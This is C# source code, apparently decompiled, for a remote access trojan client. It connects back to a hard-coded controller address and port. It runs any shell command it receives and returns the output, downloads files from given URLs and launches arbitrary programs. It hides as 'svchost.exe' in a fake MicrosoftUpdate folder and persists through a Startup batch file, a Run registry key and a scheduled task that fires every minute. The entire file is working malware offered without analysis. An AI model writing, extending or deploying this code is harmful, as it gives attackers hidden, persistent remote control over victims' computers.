using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SocketClient;

internal class Program
{
	[DllImport("User32.dll")]
	public static extern short GetAsyncKeyState(Keys ArrowKeys);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static string RunCmd(string command)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo("cmd", "/C " + command);
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		return process.StandardOutput.ReadToEnd();
	}

	private static void Persist()
	{
		try
		{
			Directory.CreateDirectory(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\"));
			StreamWriter streamWriter = new StreamWriter(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") + "windowsupdate.bat");
			streamWriter.WriteLine("start %USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\svchost.exe");
			streamWriter.Close();
		}
		catch
		{
		}
		try
		{
			if (File.Exists(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\svchost.exe")))
			{
				File.Delete(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\svchost.exe"));
			}
		}
		catch
		{
		}
		try
		{
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName!.Split(new char[1] { '\\' })[Process.GetCurrentProcess().MainModule!.FileName!.Split(new char[1] { '\\' }).Length - 1], Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\svchost.exe"));
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			string text = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\svchost.exe");
			registryKey.SetValue(Path.GetFileName(text), text);
		}
		catch
		{
		}
		try
		{
			RunCmd("schtasks.exe /create /tn microsoftupdate /tr " + Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\svchost.exe") + " /SC minute /mo 1");
		}
		catch
		{
		}
	}

	private static void Main(string[] args)
	{
		string sendstring;
		string message;
		while (true)
		{
			Dns.GetHostEntry(Dns.GetHostName());
			IPAddress iPAddress = IPAddress.Parse("192.168.0.38");
			IPEndPoint remoteEP = new IPEndPoint(iPAddress, 13733);
			Socket socket = new Socket(iPAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			while (true)
			{
				try
				{
					socket.Connect(remoteEP);
				}
				catch
				{
					Thread.Sleep(5000);
					continue;
				}
				break;
			}
			byte[] array = new byte[420];
			int num = 0;
			num = socket.Receive(array);
			string @string = Encoding.ASCII.GetString(array, 0, num);
			socket.Shutdown(SocketShutdown.Both);
			socket.Close();
			socket = new Socket(iPAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			while (true)
			{
				try
				{
					socket.Connect(new IPEndPoint(iPAddress, Convert.ToInt32(@string)));
				}
				catch
				{
					Thread.Sleep(5000);
					continue;
				}
				break;
			}
			Console.WriteLine("Socket connected to -> {0} ", socket.RemoteEndPoint!.ToString());
			byte[] array2 = new byte[131072];
			while (!socket.Poll(1000, SelectMode.SelectRead))
			{
				try
				{
					sendstring = "Good";
					int count = 0;
					try
					{
						count = socket.Receive(array2);
					}
					catch
					{
					}
					message = Encoding.ASCII.GetString(array2, 0, count);
					if (message != "" && message.IndexOf("/say ") == 0)
					{
						Console.WriteLine("Message from Server -> {0}", message.Replace("/say ", ""));
					}
					else if (message.IndexOf("/image ") == 0)
					{
						byte[] array3 = Convert.FromBase64String(message.Split(new char[1] { ',' })[1]);
						string input = Regex.Split(message, "data:image/")[1];
						input = Regex.Split(input, ";")[0];
						using FileStream fileStream = new FileStream("OutputImage." + input, FileMode.Create);
						fileStream.Write(array3, 0, array3.Length);
						fileStream.Flush();
					}
					else if (message.IndexOf("/download ") == 0)
					{
						message += "|";
						WebClient webClient = new WebClient();
						try
						{
							webClient.DownloadFile(message.Replace("/download ", "").Split(new char[1] { '|' })[0], message.Replace("/download ", "").Split(new char[1] { '|' })[1]);
							Console.WriteLine("Server downloaded file from url: " + message.Replace("/download ", "").Split(new char[1] { '|' })[0] + " And saved as: " + message.Replace("/download ", "").Split(new char[1] { '|' })[1]);
							webClient.Dispose();
						}
						catch
						{
						}
					}
					else if (message.IndexOf("/exec ") == 0)
					{
						message += "|";
						Process process = new Process();
						process.StartInfo = new ProcessStartInfo(message.Replace("/exec ", "").Split(new char[1] { '|' })[0], message.Replace("/exec ", "").Split(new char[1] { '|' })[1]);
						process.Start();
						Console.WriteLine("Server opened following file: " + message.Replace("/exec ", "").Split(new char[1] { '|' })[0] + " with arguments: " + message.Replace("/exec ", "").Split(new char[1] { '|' })[1]);
					}
					else
					{
						try
						{
							Console.WriteLine("Executing command: " + message);
							Task task = Task.Run(delegate
							{
								sendstring = RunCmd(message);
							});
							if (!task.Wait(TimeSpan.FromSeconds(10.0)))
							{
								sendstring = "Failed...";
							}
						}
						catch
						{
							sendstring = "Fail";
						}
					}
					byte[] bytes = Encoding.ASCII.GetBytes(sendstring);
					try
					{
						socket.Send(bytes);
					}
					catch
					{
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
			socket.Shutdown(SocketShutdown.Both);
			socket.Close();
			Console.WriteLine("Server disconnected....");
		}
	}
}
